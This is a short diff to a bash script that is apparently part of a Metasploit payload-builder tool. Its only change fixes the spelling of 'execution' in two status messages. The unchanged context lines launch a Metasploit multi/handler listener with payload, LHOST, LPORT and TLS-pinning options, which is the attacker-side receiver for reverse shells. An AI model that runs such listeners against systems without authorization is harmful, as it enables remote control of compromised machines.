@@ -322,7 +322,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
-  echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
+  echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
   sleep 2
 
 
@@ -351,7 +351,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
-  echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
+  echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
   sleep 2
 
 
